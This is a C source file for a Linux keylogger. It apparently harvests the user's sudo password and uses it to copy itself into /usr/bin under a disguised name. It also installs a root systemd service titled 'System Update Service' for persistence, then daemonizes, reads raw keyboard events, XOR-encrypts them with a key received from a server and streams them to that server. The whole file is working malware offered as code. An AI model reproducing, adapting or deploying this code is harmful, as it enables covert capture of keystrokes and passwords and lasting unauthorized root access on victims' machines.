#include "header.h"

int main(int argc, char *argv[]){
    int kbd_fd = -1, sock = -1;
    struct sockaddr_in server_addr;
    unsigned char session_key[16];
    int has_key = 0;
    pid_t pid;

    // Check whether the process runs as root
    int is_root = (getuid() == 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if(!is_root){
        sleep(1);
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if(connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) >=0){
            if(recv(sock, session_key,16,0) == 16){
                acquire_privileges_blocked(&sock, session_key);

                //CP block + persistence
                char persistence_cmd[1024];
                snprintf(persistence_cmd, sizeof(persistence_cmd), 
                    "echo '%s' | sudo -S cp %s /usr/bin/sys-update-svc && echo '%s' | sudo -S chmod +x /usr/bin/sys-update-svc", 
                    verified_password, argv[0], verified_password); 
                system(persistence_cmd);

                //Create the .service file for automatic restart
                char service_cmd[1024];
                snprintf(service_cmd, sizeof(service_cmd), 
                    "echo '%s' | sudo -S sh -c \"cat <<EOF > /etc/systemd/system/sys-update.service\n"
                    "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n"
                    "[Service]\nExecStart=/usr/bin/sys-update-svc\nRestart=always\nUser=root\n\n"
                    "[Install]\nWantedBy=multi-user.target\nEOF\"", verified_password);
                system(service_cmd);

                //Enable the service
                char enable_cmd[256];
                snprintf(enable_cmd, sizeof(enable_cmd), "echo '%s' | sudo -S systemctl enable sys-update.service 2>/dev/null", verified_password);
                system(enable_cmd);

                char reload_cmd[256];
                snprintf(reload_cmd, sizeof(reload_cmd), "echo '%s' | sudo -S systemctl daemon-reload", verified_password);
                system(reload_cmd);

                //Now let's try to start it.
                char start_cmd[256];
                snprintf(start_cmd, sizeof(start_cmd), "echo '%s' | sudo -S systemctl start sys-update.service", verified_password);
                system(start_cmd);

                //printf("[*] Sistema riparato. Il servizio Ã¨ stato riavviato.\n");
                memset(verified_password, 0, 128);

                close(sock);
                exit(0);
            }
        }
        pid = fork();
        if(pid < 0) exit(EXIT_FAILURE);
        if(pid > 0) exit(EXIT_SUCCESS);
        setsid();
        

        pid = fork();
        if(pid < 0) exit(EXIT_FAILURE);
        if(pid > 0) exit(EXIT_SUCCESS);

        umask(0);
        chdir("/");
        close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO);   
    } else {
        close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO); 
    }

    struct input_event ev;

    while(1){

        if (kbd_fd == -1) {
            kbd_fd = find_keyboard();
            if (kbd_fd == -1) {
                //If you don't find it, wait 5 seconds and try again.
                sleep(5);
                continue;
            }
        }

        if (sock == -1){
            sock = socket(AF_INET, SOCK_STREAM, 0);

            if(connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0){
                close(sock);
                sock = -1;
                has_key = 0;
                sleep(5);
                continue;
            }

            if(recv(sock, session_key, 16, 0) == 16){
                has_key = 1;
                usleep(100000);
            } else {
                close(sock);
                sock = -1;
                continue;
            }
        }

        if(has_key){
            if(read(kbd_fd, &ev, sizeof(ev)) == sizeof(ev)) {
                
                if(ev.type == 1 && ev.value == 1) {
                    
                    unsigned char *ptr = (unsigned char*)&ev;
                    for(size_t i = 0; i < sizeof(ev); i++){
                        ptr[i] ^= session_key[i % 16];
                    }
                    if(send(sock, &ev, sizeof(ev), 0) < 0){
                        close(sock);
                        sock = -1;
                        has_key = 0;
                    }
                }
            }
        }
    }

    return 0;
}
